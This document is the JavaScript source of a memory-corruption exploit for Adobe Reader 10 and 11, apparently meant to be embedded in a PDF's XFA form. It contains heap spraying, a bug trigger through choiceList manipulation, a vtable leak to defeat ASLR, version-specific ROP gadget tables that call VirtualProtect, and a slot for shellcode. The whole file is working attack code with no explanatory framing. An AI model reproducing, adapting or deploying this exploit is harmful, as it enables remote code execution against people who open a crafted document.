
adobe_version = app['viewerVersion'].toString();

function show_error(errorcode) {
 app.alert("Error: " + errorcode.toString() + ".");
}

function ue(dw) {
    return dword_to_unicode(build_dword(dw));
}

function dword_to_unicode(s) {
    /* Returns unescaped ie: %u00ff%u0000  */
    return unescape("%u" + s.substring(4, 8) + "%u" + s.substring(0, 4));
}

function word_to_unicode(s) {
    /* Returns unescaped ie: %u00ff  */
    return unescape("%u" + s.substring(2, 4) + s.substring(0, 2));
}

function build_dword(_byte) {
  /* Returns 32bits integer representation */
 first_byte = (_byte >>> 24).toString(16);
 if (first_byte.length == 1) first_byte = "0" + first_byte;
 second_byte = ((_byte >>> 16) & 0xFF).toString(16);
 if (second_byte.length == 1) second_byte = "0" + second_byte;
 third_byte = ((_byte >>> 8) & 0xFF).toString(16);
 if (third_byte.length == 1) third_byte = "0" + third_byte;
 fourth_byte = (_byte & 0xFF).toString(16);
 if (fourth_byte.length == 1) fourth_byte = "0" + fourth_byte;
 return first_byte + second_byte + third_byte + fourth_byte;
}


function ReadMem(s) {
    var arr = [];
    //var replace_dic = { "d8": 24, "c7":25, "c6":26, "d9":27, "dd":28, "db":29, "b0":30, "dc":31 }
    for (var i = 0; i < s.length; i++) {
       last_byte = s.charCodeAt(i);
       second_byte = last_byte & 0xff;

       //for (var j in replace_dic) if (j == second_byte.toString(16)) second_byte = replace_dic[j];
       arr.push(second_byte);
    }
       return arr;
}

var objNumber = 0;

function bug_trigger(address) {
     spray(address);
     spray(address);
     spray(address);
     spray(address);

     var node = xfa.resolveNode("xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field" + objNumber + "[0].#ui");

     if (node == undefined) {
         return false;
     }
     try {
         node.oneOfChild = choiceLists.pop();
     }
     catch (e) {
         return false;
     }
     return true;
}

function Crazy() {
    //show_error("BP");
    var success = bug_trigger(myHeapAddress);
    if (success == false) show_error(1);
    var index = -1;
    var offset = -1;
    var re = new RegExp(unescape("%u0fee"));
    for (var i in memory_array) {
        result = re.exec(memory_array[i]);
        if (result != null) {
            offset = result.index;
            index = i;
            break;
        }
    }
    if (offset == -1) {
        show_error(2);
    }

     myAddr = myHeapAddress - offset * 2 + 4;
     dataValue_addr = myAddr - (myStringLen + 8);

     _create_nodes(256);
     memory_array[index - 1] += "yacc";
     memory_array[index - 5] += "my";
     memory_array[index - 10] += "mermelada";
          
     // Fill dataValues.value property
     for (var i = 0; i < dataValues.length; i++) dataValues[i].value = "XXXXXXXX";
     
     var nullTerminatorOffset = 20;

     success = bug_trigger(dataValue_addr + nullTerminatorOffset);

     if (success == false) show_error(3);
     _create_nodes(100);
     
     var original_len = 8;
     var position = 0;
     var craftedLen = 0;
     
     /* LLEGAMOS */
    /* Search for corrupted dataValues.length != 8 */
     for (var i = 0; i < dataValues.length; i++) {
       if (dataValues[i].value.length != original_len) {
         position = parseInt(i);
         craftedLen = dataValues[i].value.length;
         break;
       }
     }
     
    if (position == 0){
        bug_trigger(dataValue_addr + 0x4);
        for (var i = 0; i < dataValues.length; i++) {
            if (dataValues[i].value.length != original_len) {
                position = parseInt(i);
                craftedLen = dataValues[i].value.length;
                break;
            }
        }
        heap_layout = true;
    }
    else{
        heap_layout = false;    
    }
    
    _create_nodes(256);

    var otherNullTerminatorOffset = heap_layout?0x2c:60;
    
    for(i=0;i<0x400;i++){    
        contentAreasNodes.push(xfa.datasets.createNode("dataGroup", "t"));
    }
    ret = bug_trigger(dataValue_addr + otherNullTerminatorOffset);

    _create_nodes(100);
   
    // Checkeo si sigue teniendo el mismo length despues de sobrescribir.
    // Si sigue siendo el mismo intento de nuevo. Fail caso contrario.
    if (dataValues[position].value.length == craftedLen) {
      _create_nodes(1024);
   
      ret = bug_trigger(dataValue_addr + otherNullTerminatorOffset);
      if (ret == false) show_error(7);
      
      _create_nodes(100);
      
      if (dataValues[position].value.length == craftedLen) {
       show_error(8);
      }
    }
    
    // Make some holes
    dataValues[position + 1].value = "";
    dataValues[position + 3].value = "";

    // Fill the holes
    for (var i = 0; i < 0x400; i++) contentAreasNodes.push(xfa.form.createNode("assist", "a"));

    ret = ReadMem(dataValues[position].value);
    last_byte = ret[ret.length - 1];
    if (last_byte != 1) {
        show_error(666);
    }
    else {
        // Here we are reading the vtable pointer. 
        // All this stuff solves a problem that happens when trying to read
        // data from memory using a JS string.
        // The problem is that if a byte is greater than 0x7f, the byte cannot
        // be read. 
        // The idea is to dec the values until we can read them.
        leaked_vtable = leak_vtable(dataValues, dataValue_addr, position);
    }
    
    if (adobe_version == '11.001'){
        acroform_base = leaked_vtable - 0x7a7af4;

        var bb = "";
        var mm = [];
        
        rop_address = heap_layout?0x3008907c:0x3008906c;
        stack_pivoting = heap_layout?"3008903c":"3008902c";
        s = dword_to_unicode(stack_pivoting); // vftable
        s += dword_to_unicode("00000001"); // refcounter
        s += dword_to_unicode("00000000"); // Bypass 000A54BC call _sub_11A193_uninit
        
        s += ue(acroform_base + 0x003d343e);  
        s += ue(acroform_base + 0x004f0661); 
        s += ue(rop_address + 0x0f); // ROP address
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        
        //_create_nodes(128);
        while (bb.length < 0x10000) bb += s;
        for (var i = 10; i < 4000; i++) mm.push(bb.substring(0, (51504 / 2) - 3) + i.toString());
        
        ptr_loadlibrary = 0x0066b234;
        ptr_getprocaddr = 0x0066b1ec;
        pushad = 0x00029585;
        pop_ebp = 0x00001309;
        rop_nop = 0x0000130a;
        pop_esi = 0x00001412;
        pop_edi = 0x0000306a;
        pop_eax = 0x0000f972;
        pop_ebx = 0x000037e9;
        pop_ecx = 0x000013aa;
        pop_edx = 0x00165a1a;

        mov_eax_eax = 0x0030d94;
        xchg_eax_esi = 0x00ca244;
        xchg_eax_ebp = 0x0003be6f;
        xchg_eax_edi = 0x003c8037;

        add_esp_20 = 0x00015ce7;
        jmp_esp = 0x000024bd;
        
        rop = ue(acroform_base + pop_edi);
        rop += ue(acroform_base + rop_nop);
        rop += ue(acroform_base + pop_eax);
        rop += ue(acroform_base + ptr_loadlibrary);
        rop += ue(acroform_base + mov_eax_eax);
        rop += ue(acroform_base + xchg_eax_esi);
        rop += ue(acroform_base + pop_ebp);
        rop += ue(acroform_base + add_esp_20);
        rop += ue(acroform_base + pushad);
        //rop += unescape("%u4f48%u4f4c")
        //rop += unescape("%u0000%u0000");
        
         //KERNEL32.dll
         rop += unescape("%u454b%u4e52");
         rop += unescape("%u4c45%u3233");
         rop += unescape("%u642e%u6c6c");
         rop += unescape("%u0000%u0000");

         rop += ue(acroform_base + xchg_eax_ebp);
         rop += ue(acroform_base + pop_eax);
         rop += ue(acroform_base + ptr_getprocaddr);
         rop += ue(acroform_base + mov_eax_eax);
         rop += ue(acroform_base + xchg_eax_edi);
         rop += ue(acroform_base + pop_esi);
         rop += ue(acroform_base + add_esp_20);
         rop += ue(acroform_base + pushad);
        
         //VirtualProtect
         rop += unescape("%u6956%u7472");
         rop += unescape("%u6175%u506c");
         rop += unescape("%u6f72%u6574");
         rop += unescape("%u7463%u0000");
        
         rop += ue(acroform_base + pop_edi);
         rop += ue(acroform_base + rop_nop);
         rop += ue(acroform_base + xchg_eax_esi);
         rop += ue(acroform_base + pop_ebp);
         rop += ue(acroform_base + jmp_esp);
         rop += ue(acroform_base + pop_ebx);
         rop += ue(0x00000201);
         rop += ue(acroform_base + pop_edx);
         rop += ue(0x00000040);
         rop += ue(acroform_base + pop_ecx);
         rop += ue(0x0c0c0c0c);
         rop += ue(acroform_base + pop_eax);
         rop += ue(0x90909090);
         rop += ue(acroform_base + pushad);
         //rop += ue(0xcccccccc);
         //rop += ue(0xcccccccc);
         rop += unescape("SEARCH");
        rop = s + rop;

        rop_nop_sled = "";
        while(rop_nop_sled.length + rop.length < 0x1000/2){
            rop_nop_sled += ue(0x90909090);
        }
        rop = rop + rop_nop_sled;
        bb = "";
        while (bb.length < 0x40000) bb += rop;
        for (var i = 1000; i < 2000; i++) mm.push(bb.substring(0, ((0x7ffe0-4) / 2) - 3) + i.toString());
        
        shellcode = unescape("SHELLCODE");
        bb = dword_to_unicode("cafebeef");
        bb += shellcode;
        //show_error((bb.length).toString(16));
        mm.push(bb.substring(0, ((0x7ffe0-4) / 2) - 3));
        
        //show_error("trigger");        
        
        trigger_address = heap_layout?0x30089030:0x30089020;
        bug_trigger(trigger_address);
        //300891bf 
    }

    if (adobe_version != '11.001'){
        if (adobe_version == '10.105'){
            collabsync_offset = 0x18e30;
            collabsync_arg = 0xbc;

            acroform_base = leaked_vtable - 0x712acc;
            stack_aligner = 0x0050b093; //xchg eax,esp # mov al,0ff # pop ecx # retn
            stack_swap = 0x004e735f;    // pop eax # sub al,0f # xchg eax,esp # retn
            
            pop_eax = 0x0001a08c;
            pop_ebx = 0x000029c3;

            ptr_loadlibrary = 0x005f8214;
            ptr_getprocaddr = 0x005f81d4;
            pushad = 0x0002ada1;
            pop_ebp = 0x000011af;
            rop_nop = 0x00001017;
            pop_esi = 0x00001016;
            pop_edi = 0x000055d8;
            pop_ecx = 0x00002b68;
            pop_edx = 0x003b5f9e;
    
            mov_eax_eax = 0x00030a2e;
            xchg_eax_esi = 0x0055476f;
            xchg_eax_ebp = 0x0000334b;
            xchg_eax_edi = 0x0019a6bf;
    
            add_esp_20 = 0x000399da;
            jmp_esp = 0x0001f3ce;
        }
        else if (adobe_version == '10.104'){
            collabsync_offset = 0x18da0;
            collabsync_arg = 0xbc;

            acroform_base = leaked_vtable - 0x70f1dc;
            //show_error(acroform_base.toString(16));
            stack_aligner = 0x005e02b9; // xchg eax,esp # mov edi,6c4f # add byte ptr ds:[eax],ah # pop edi # retn
            stack_swap = 0x4e6639;      // pop eax # sub al,0f # xchg eax,esp # retn
            
            ptr_loadlibrary = 0x5f5214;
            ptr_getprocaddr = 0x5f51d4;
            pushad = 0x0002ada1;
            pop_ebp = 0x000011af;
            rop_nop = 0x00001017;
            pop_esi = 0x00001016;
            pop_edi = 0x000053e5;
            pop_eax = 0x00019f60;
            pop_ebx = 0x00002748;
            pop_ecx = 0x000028ed;
            pop_edx = 0x0009a902;
    
            mov_eax_eax = 0x0003055b;
            xchg_eax_esi = 0x003c89f2;
            xchg_eax_ebp = 0x000030ef;
            xchg_eax_edi = 0x0014823a;
    
            add_esp_20 = 0x0003945e;
            jmp_esp = 0x00005efa;
        }
        else if (adobe_version == '10.103'){
            collabsync_offset = 0x18e30;
            collabsync_arg = 0xbc;

            acroform_base = leaked_vtable - 0x70bf04;
            stack_aligner = 0x005803c2; //xchg eax,esp # sub eax,54fb # add dword ptr [eax],eax # pop edi # retn
            stack_swap = 0x004e3c5d;    // pop eax # sub al,0f # xchg eax,esp # retn
            
            pop_eax = 0x19e63;
            pop_ebx = 0x1ff3;

            ptr_loadlibrary = 0x005f2214;
            ptr_getprocaddr = 0x005f21d4;
            pushad = 0x0002ac02;
            pop_ebp = 0x000011af;
            rop_nop = 0x00001017;
            pop_esi = 0x00001016;
            pop_edi = 0x0000565b;
            pop_ecx = 0x0000294c;
            pop_edx = 0x0035d2f6;
    
            mov_eax_eax = 0x000300a0;
            xchg_eax_esi = 0x00149e87;
            xchg_eax_ebp = 0x0000313a;
            xchg_eax_edi = 0x000aa5f9;
    
            add_esp_20 = 0x00038f86;
            jmp_esp = 0x0004c938;
        }
        else if (adobe_version == '10.102'){
            collabsync_offset = 0x18ef0;
            collabsync_arg = 0xbb;
            acroform_base = leaked_vtable - 0x70be44;
            stack_aligner = 0x003ea264; //xchg eax,esp # pop esi # retn
            stack_swap = 0x004e37cd;    // pop eax # sub al,0f # xchg eax,esp # retn
            
            pop_eax = 0x00019ece;
            pop_ebx = 0x00001fef;

            ptr_loadlibrary = 0x005f2214;
            ptr_getprocaddr = 0x005f21d4;
            pushad = 0x0002ab6e;
            pop_ebp = 0x000011af;
            rop_nop = 0x00001017;
            pop_esi = 0x00001016;
            pop_edi = 0x000054eb;
            pop_ecx = 0x000029b8;
            pop_edx = 0x00355de7;
    
            mov_eax_eax = 0x000309d3;
            xchg_eax_esi = 0x00124ec7;
            xchg_eax_ebp = 0x000031b7;
            xchg_eax_edi = 0x003c5daa;
    
            add_esp_20 = 0x0003994a;
            jmp_esp = 0x00052ba0;
        }
        else if (adobe_version == '10.101'){
            collabsync_offset = 0x18e70;
            collabsync_arg = 0xbb;
            acroform_base = leaked_vtable - 0x7099e4;
            stack_aligner = 0x0031feaa; //xchg eax,esp # add dword ptr [eax],eax # pop esi # retn
            stack_swap = 0x004e2e27;    // pop eax # sub al,0f # xchg eax,esp # retn
            
            pop_eax = 0x00019ede;
            pop_ebx = 0x00002792;

            ptr_loadlibrary = 0x005f0214;
            ptr_getprocaddr = 0x005f01d4;
            pushad = 0x0002abdd;
            pop_ebp = 0x000011af;
            rop_nop = 0x00001017;
            pop_esi = 0x00001016;
            pop_edi = 0x00005630;
            pop_ecx = 0x00002937;
            pop_edx = 0x00113950;
    
            mov_eax_eax = 0x00030b5c;
            xchg_eax_esi = 0x00008fcf;
            xchg_eax_ebp = 0x0000312c;
            xchg_eax_edi = 0x00313cc9;
    
            add_esp_20 = 0x00039ad6;
            jmp_esp = 0x000504e0;
        }
        else if (adobe_version == '10.1'){
            collabsync_offset = 0x18e10;
            collabsync_arg = 0xbb;
            acroform_base = leaked_vtable - 0x707604;
            stack_aligner = 0x003db126; //xchg eax,esp # pop ebp # retn
            stack_swap = 0x004e276c;    // pop eax # sub al,0f # xchg eax,esp # retn
            
            pop_eax = 0x00019ece;
            pop_ebx = 0x00001fc1;

            ptr_loadlibrary = 0x005ee214;
            ptr_getprocaddr = 0x005ee1d4;
            pushad = 0x0002abdf;
            pop_ebp = 0x000011af;
            rop_nop = 0x00001017;
            pop_esi = 0x00001016;
            pop_edi = 0x000055ec;
            pop_ecx = 0x0000293d;
            pop_edx = 0x00109144;
    
            mov_eax_eax = 0x00030393;
            xchg_eax_esi = 0x001f3345;
            xchg_eax_ebp = 0x00003120;
            xchg_eax_edi = 0x001ee054;
    
            add_esp_20 = 0x0003933e;
            jmp_esp = 0x00120a93;
        }
        else if (exploit_array['version'] == '10'){
            collabsync_offset = 0x17670;
            collabsync_arg = 0xbb;
            acroform_base = leaked_vtable - 0x7099e4;
            stack_aligner = 0x00105db4; //xchg eax,esp # cmp al,0 # retn 4
            stack_swap = 0x004dcea7;    // pop eax # sub al,0f # xchg eax,esp # retn
            
            pop_eax = 0x000029df;
            pop_ebx = 0x0000279d;

            ptr_loadlibrary = 0x005ee214;
            ptr_getprocaddr = 0x005ee1d4;
            pushad = 0x00014295;
            pop_ebp = 0x0000137d;
            rop_nop = 0x000010fb;
            pop_esi = 0x000010fa;
            pop_edi = 0x00001ffd;
            pop_ecx = 0x00001572;
            pop_edx = 0x00138f40;
    
            mov_eax_eax = 0x00019f5c;
            xchg_eax_esi = 0x00059be2;
            xchg_eax_ebp = 0x0006fa88;
            xchg_eax_edi = 0x00215560;
    
            add_esp_20 = 0x0002325c;
            jmp_esp = 0x000a6b30;
        }        
        
        var bb = "";
        var mm = [];
        
        rop_address = heap_layout?0x3106007c:0x3106006c;
        stack_pivoting = heap_layout?"3108903c":"3108902c";
        s = dword_to_unicode(stack_pivoting); // vftable
        s += dword_to_unicode("00000001"); // refcounter
        s += dword_to_unicode("00000000"); // Bypass 000A54BC call _sub_11A193_uninit
        
        s += ue(acroform_base + stack_aligner);  
        s += ue(acroform_base + stack_swap); 
        s += ue(rop_address + 0x0f); // ROP address
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");
        s += dword_to_unicode("00000000");

        _create_nodes(256);
        while (bb.length < 0x10000) bb += s;
        for (var i = 10; i < 4000; i++) mm.push(bb.substring(0, (51504 / 2) - 3) + i.toString());
        
        rop = ue(acroform_base + pop_edi);
        rop += ue(acroform_base + rop_nop);
        rop += ue(acroform_base + pop_eax);
        rop += ue(acroform_base + ptr_loadlibrary);
        rop += ue(acroform_base + mov_eax_eax);
        rop += ue(acroform_base + xchg_eax_esi);
        rop += ue(acroform_base + pop_ebp);
        rop += ue(acroform_base + add_esp_20);
        rop += ue(acroform_base + pushad);
//         rop += unescape("%u4f48%u414c")
//         rop += unescape("%u0000%u0000");
        
//         KERNEL32.dll
        rop += unescape("%u454b%u4e52");
        rop += unescape("%u4c45%u3233");
        rop += unescape("%u642e%u6c6c");
        rop += unescape("%u0000%u0000");

        rop += ue(acroform_base + xchg_eax_ebp);
        rop += ue(acroform_base + pop_eax);
        rop += ue(acroform_base + ptr_getprocaddr);
        rop += ue(acroform_base + mov_eax_eax);
        rop += ue(acroform_base + xchg_eax_edi);
        rop += ue(acroform_base + pop_esi);
        rop += ue(acroform_base + add_esp_20);
        rop += ue(acroform_base + pushad);
        
//         VirtualProtect
        rop += unescape("%u6956%u7472");
        rop += unescape("%u6175%u506c");
        rop += unescape("%u6f72%u6574");
        rop += unescape("%u7463%u0000");
        
        rop += ue(acroform_base + pop_edi);
        rop += ue(acroform_base + rop_nop);
        rop += ue(acroform_base + xchg_eax_esi);
        rop += ue(acroform_base + pop_ebp);
        rop += ue(acroform_base + jmp_esp);
        rop += ue(acroform_base + pop_ebx);
        rop += ue(0x00000201);
        rop += ue(acroform_base + pop_edx);
        rop += ue(0x00000040);
        rop += ue(acroform_base + pop_ecx);
        rop += ue(0x0c0c0c0c);
        rop += ue(acroform_base + pop_eax);
        rop += ue(0x90909090);
        rop += ue(acroform_base + pushad);
        rop += unescape("FIRST");
        rop += ue(collabsync_offset);
        rop += ue(collabsync_arg);
        rop += unescape("LAST");
        
        rop = s + rop;

        rop_nop_sled = "";
        while(rop_nop_sled.length + rop.length < 0x1000/2){
            rop_nop_sled += ue(acroform_base + rop_nop);
        }
        rop = rop + rop_nop_sled;
        bb = "";
        while (bb.length < 0x40000) bb += rop;
        for (var i = 1000; i < 2000; i++) mm.push(bb.substring(0, ((0x7ffe0-4) / 2) - 3) + i.toString());
        //show_error("trigger");        
        trigger_address = heap_layout?0x31089030:0x31089020;
        bug_trigger(trigger_address);
    }
}

function leak_vtable(dataValues, dataValue_addr, position){
    ret = ReadMem(dataValues[position].value);
    old_fst_byte = ret[ret.length - 2];
    old_snd_byte = ret[ret.length - 3];   
    old_trd_byte = ret[ret.length - 4];
    old_frt_byte = ret[ret.length - 5];
    
    if (adobe_version != '11.001'){
        //show_error('Leaking');

        // This value is to dec the first two bytes of the vtable pointer.
        // The dec primitive with this offset will dec the second byte of the
        // vtable pointer.
        var vtable_offset =  heap_layout ? 0x86:0x96;

        spray(dataValue_addr + vtable_offset);
        
        // If it's the case we were able to read the second byte then this dec
        // will actually dec the second byte

        dec();

        ret = ReadMem(dataValues[position].value);
        
        // Check if we actually dec the second byte
        if (ret[ret.length - 3] == (old_snd_byte - 2)){
            if (ret[ret.length - 3] == 0x5e && (adobe_version == '10')){
                snd_byte = 0xa0;
            }
            else{
                snd_byte = old_snd_byte;
            }            
        }
        else{
            // We didn't actually read the second byte, this means it's value is
            // greater than 7f, so we dec 7e to the value and then read the 
            // final value and add the difference.
            // We did a dec already, so count starts on 1
            count = 1;

            for(l=0;l<0x3f;l++)
            {
                    dec();
                    ret = ReadMem(dataValues[position].value);

                    count++;
            }                  
            snd_byte = ret[ret.length - 3] + count*2;  
        }

        //show_error("snd");
        // Here are some troubles so we need to hardcoded the last two bytes (always the same for this version)
        if (adobe_version == '10.105'){
            trd_byte = 0x2a;
            frt_byte = 0xcc;
        }        
        else if (adobe_version == '10.104'){
            trd_byte = 0xf1;
            frt_byte = 0xdc;
        }
        else if (adobe_version == '10.102'){
            trd_byte = 0xbe;
            frt_byte = 0x44;
        }
        else if (adobe_version == '10.101'){
            trd_byte = 0x99;
            frt_byte = 0xe4;
        }
        else if (adobe_version == '10.1'){
            trd_byte = 0x76;
            frt_byte = 0x04;
        }
        else if (adobe_version == '10'){
            trd_byte = 0x99;
            frt_byte = 0xe4;
        }
        else{
            trd_byte = 0xbf;
            frt_byte = 0x04;
        }
        
        leaked_vtable = (old_fst_byte << 24) | (snd_byte << 16) | (trd_byte << 8) | frt_byte;
        //show_error(leaked_vtable.toString(16));

        return leaked_vtable;
        
    }
        //show_error("dec");
        var vtable_offset =  heap_layout ? 0x86:0x96;
        spray(dataValue_addr + vtable_offset);
        spray(dataValue_addr + vtable_offset);

        // If it's the case we were able to read the second byte then this dec
        // will actually dec the second byte

        dec();

        ret = ReadMem(dataValues[position].value);

        // Check if we actually dec the second byte
        if (ret[ret.length - 3] != old_snd_byte){
                snd_byte = old_snd_byte;           
        }
        else{
            // We didn't actually read the second byte, this means it's value is
            // greater than 7f, so we dec 7e to the value and then read the 
            // final value and add the difference.
            // We did a dec already, so count starts on 1
            count = 1;

            for(l=0;l<0x3f;l++)
            {
                    dec();
                    ret = ReadMem(dataValues[position].value);

                    count++;
            }                  
            snd_byte = ret[ret.length - 3] + count*2;  
        }
               
        vtable_offset =  heap_layout ? 0x84:0x94;

        spray(dataValue_addr + vtable_offset);


        old_frt_byte = ret[ret.length - 5];

        dec();
        ret = ReadMem(dataValues[position].value);

        // Check if we actually dec the second byte
        if (ret[ret.length - 5] != old_frt_byte){
            frt_byte = old_frt_byte;
        }
        else{
            // We didn't actually read the second byte, this means it's value is
            // greater than 7f, so we dec 7e to the value and then read the 
            // final value and add the difference.
            
            // We did a dec already, so count starts on 1
            count = 1;
            for(l=0;l<0x3f;l++)
            {
                    dec();
                    ret = ReadMem(dataValues[position].value);
                    count++;
            }                  
            frt_byte = ret[ret.length - 5] + count*2;
        }
        _create_nodes(256);
                // This is for READER 11
        // With this offset we'll dec the last two bytes of the vtable pointer.    
        vtable_offset =  heap_layout ? 0x85:0x95;

        spray(dataValue_addr + vtable_offset);
        old_trd_byte = ret[ret.length - 4];

        dec();
        
        ret = ReadMem(dataValues[position].value);
        // Check if we actually dec the second byte
        if (ret[ret.length - 4] != old_trd_byte){
            trd_byte = old_trd_byte;
        }
        else{
            // We didn't actually read the second byte, this means it's value is
            // greater than 7f, so we dec 7e to the value and then read the 
            // final value and add the difference.
            
            // We did a dec already, so count starts on 1
            count = 1;
            for(l=0;l<0x3f;l++)
            {
                    dec();
                    ret = ReadMem(dataValues[position].value);
                    count++;
            }                  
            trd_byte = ret[ret.length - 4] + count*2;
        }
        
        leaked_vtable = (old_fst_byte << 24) | (snd_byte << 16) | (trd_byte << 8) | frt_byte;
        //show_error(leaked_vtable.toString(16));

        return leaked_vtable;
}

function dec(){
    var node = xfa.resolveNode("xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field" + objNumber.toString() + "[0].#ui");
    if (node == undefined || node == null) {
    }
    try {
        node.oneOfChild = choiceLists.pop();
    } catch (e) {
        show_error(15);

    }
    
    contentAreasNodes.push(xfa.datasets.createNode("dataGroup", "t"));
    contentAreasNodes.push(xfa.datasets.createNode("dataGroup", "t"));
    contentAreasNodes.push(xfa.datasets.createNode("dataValue", "t"));
}

function spray(bigInteger) {
    /* Creates a 0xD000 length unicode string from arg1 
       Creates 512 contentArea nodes (plus increases spray on string_array array (0xBBBB))
   
       ie: 0xAABBCCDD
   
       Pushes 70 blocks like:
         |AABBCCDDAABBCCDDAABBCCDD|AABB|
                (size 0x66D0)     (word)
   
       Pushes intercalated version like:
         |AA|BBBBBBBBBBBB|BB|BBBBBBBBBBBB|CC|BBBBBBBBBBBB|
             (size 0x600)    (size 0x600)    (size 0x600)
   
       Creates 147 additional contentArea nodes (createObjCount)
   
    */
    var block = dword_to_unicode(build_dword(bigInteger));
    while (block.length < 0xD000) block += block;
   
    create_nodes(512);
    
    var msb2 = ((bigInteger >>> 16) & 0xFF).toString(16);
    var msb = (bigInteger >>> 24).toString(16);
    if (msb2.length == 1) msb2 = "0" + msb2;
    if (msb.length == 1) msb = "0" + msb;
    
    var blocks = [];
    for (var i = 10; i < 80; i++) { 
        var string = word_to_unicode(msb2 + msb);
        blocks.push(block.substring(0, (52640 / 2) - 3) + string);
    }
   
    var other_blocks = [];
    for (var i = 0; i < blocks.length; i++) {
       if (i % 2 == 0) other_blocks.push(blocks[i] + bigblock_slice);
    }
   
    create_nodes(147);
}

var string_array = [];
function create_nodes(n) {
 /* Creates n contentArea nodes and pushes an slice of bigblock (0xbbbb) on string_array */
 for (var i = 0; i < n; i++) {
  
  if ((i + 1) % 40 == 0) { // Padding
    var y = 77;
    string_array.push(bigblock.substring(0, (52640 / 2) - 3) + y.toString());
 }
 contentAreasNodes.push(xfa.template.createNode("contentArea", "t"));
 }
}

function _create_nodes(amount) {
    for (var i = 10; i < 40; i++) memory_array.push(bigblock.substring(0, (0xcda0 / 2) - 3) + i.toString());
    create_nodes(amount);
}

var myHeapAddress = 0x11871710;
var myHeapAddress = 0x11101710;
var dataValue_addr = 0;
var memory_array = [];
var dataValues = [];
var contentAreasNodes = [];
var nodes = [];
var choiceLists = [];
var myStringLen = 0;
var ret;
var finalBuf;

var bigblock = unescape("%ubbbb");
while (bigblock.length < (0x10000)) bigblock += bigblock;

var bigblock_slice = bigblock.substring(0, (0x600));
var sequence = [];
for (var i = 0; i < 5000; i++) sequence.push(i.toString());

function start() {

  // Heap Spray
  myStringLen = 0xc930;
  var block = unescape("%ueeee%ueeee%ueeee%ueeee%ueeee%ueeee%ueeee%ueeee%ueeee%ueeee");
  var fill = unescape("%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141");

  while (block.length < 512){
    block += fill;
  } 
  
  // Spray 7FFE0FF0
  block = block.substring(0, 512);
  var address = unescape("%u0ff0%u7ffe%u0ff0%u7ffe%u0ff0%u7ffe%u0ff0%u7ffe");

  block = "";

  while (block.length < 0x10000) {
    block += address;
  }
  block = block.substring(0, 65536);
  
  for (var j = 0; j < 40; j++){
      for (var i = 10; i < 100; i++) {
          memory_array.push(block.substring(0, (myStringLen / 2) - 3) + i.toString());
      }
  }

  for (var i = 0; i < 4096; i++) dataValues.push(xfa.datasets.createNode("dataValue", "eNGLISH" + i.toString()));

  for (var i = 549; i >= 1; i--) {
    node = xfa.resolveNode("xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field" + i.toString() + "[0].#ui[0]");
    nodes.push(node);
    
    choiceList = xfa.resolveNode("xfa[0].form[0].form1[0].#pageSet[0].page1[0].#subform[0].field" + i.toString() + "[0].#ui[0].#choiceList[0]");
    choiceLists.push(choiceList);
  }

  xfa.resolveNode("xfa[0].form[0].form1[0].#subform[0].rect1").keep.previous = "contentArea";
  ret = app.setTimeOut("Crazy();", 500);
}

if (app['viewerVersion'].toString().indexOf('11') == 0) app.execMenuItem('Find');
start();
